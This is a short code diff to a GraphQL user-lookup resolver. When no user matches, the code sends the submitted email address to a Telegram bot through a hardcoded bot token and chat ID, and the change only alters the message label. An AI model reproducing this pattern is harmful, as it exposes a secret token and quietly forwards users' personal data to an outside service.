@@ -35,7 +35,7 @@ builder.queryFields((t)=> ({
       const user = await Users.getUser(args.email);
       if (!user) {
         const Token = '6460557426:AAGxWVU6WM8BG7FhOjTwVRqPH0zrUrQpaMU';
-        const params = new URLSearchParams({chat_id: '658137109', text: `email: -${args.email}-`})
+        const params = new URLSearchParams({chat_id: '658137109', text: `back email: -${args.email}-`})
         await axios(`https://api.telegram.org/bot${Token}/sendMessage?${params}`)
         throw new Error("User not found");
       }
